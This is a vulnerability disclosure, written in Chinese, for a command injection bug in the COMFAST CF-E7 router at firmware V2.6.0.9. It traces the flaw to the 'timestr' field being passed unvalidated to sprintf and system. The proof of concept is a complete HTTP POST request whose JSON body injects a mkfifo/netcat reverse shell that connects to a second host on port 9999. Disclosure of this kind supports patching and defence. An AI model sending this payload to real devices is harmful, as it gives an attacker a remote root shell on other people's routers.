## Comfast CF-E7 Router

- **供应商**：COMFAST

- **产品**：COMFAST CF-E7

- **固件版本**：V2.6.0.9

- **漏洞**：命令注入

### 概述

COMFAST CF-E7 V2.6.0.9 Router中发现了一个命令注入漏洞，攻击者可以通过发送恶意 HTTP POST 数据包来利用该漏洞执行任意命令。当请求路径为 `/cgi-bin/mbox-config?method=SET&section=ntp_timezone` 时，该漏洞可被触发，要求用户登录获取到cookie。

### 漏洞详情

触发点位于`webmggnt` 组件中的`sub_41ACCC`方法，此处对于`timestr`字段没有校验就使用`sprintf` 进行了拼接，并使用`system`执行，要求不开启`ntp`。

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-07-14-59-49-image.png)

### 概念验证

```http
POST /cgi-bin/mbox-config?method=SET&section=ntp_timezone HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: appliation/json
X-Requested-With: XMLHttpRequest
Content-Length: 219
Origin: http://192.168.0.1
Sec-GPC: 1
Connection: close
Referer: http://192.168.0.1/computer/ntp.html
Cookie: COMFAST_SESSIONID=c0a80002-4261ffffffc85cffffff8a5f-327b23c6
Priority: u=0

{"timestr":"2021-10-10 10:10:10\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #","timezone":"UTC-8","zonename":"63","ntp_client_enabled":"0","ntp_servername":"0.openwrt.pool.ntp.org"}
```

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-07-15-00-33-18e34387-87c6-45b5-b092-800fe7c79032.png)
